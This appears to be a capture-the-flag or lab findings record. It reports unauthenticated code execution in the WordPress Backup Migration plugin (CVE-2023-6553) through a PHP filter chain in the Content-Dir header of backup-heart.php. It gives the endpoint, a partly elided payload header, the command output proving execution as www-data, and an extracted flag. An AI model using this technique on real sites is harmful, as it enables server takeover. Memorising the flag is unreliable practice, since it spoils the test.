findings.title: CVE-2023-6553 - WordPress Backup Migration Plugin RCE (PHP Filter Chain)
findings.description:
WordPress Backup Migration plugin ≤1.3.7 (CVE-2023-6553) allows unauthenticated remote code execution via a PHP filter chain injected into the Content-Dir header of backup-heart.php. The filter chain uses php://filter with chained iconv/base64 conversions to generate arbitrary PHP code that is executed via require(). Full command execution as www-data was confirmed.

Exploited endpoint: POST /wp-content/plugins/backup-backup/includes/backup-heart.php
Header: Content-Dir: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|...|convert.base64-decode/resource=php://temp

Confirmed: id = uid=33(www-data) gid=33(www-data) groups=33(www-data)
Environment enumeration confirmed FLAG env variable and file at /opt/flag.txt.
Flag extracted: flag{baf4424d-ac6a-478e-b0bc-bdc0cf3edd33}
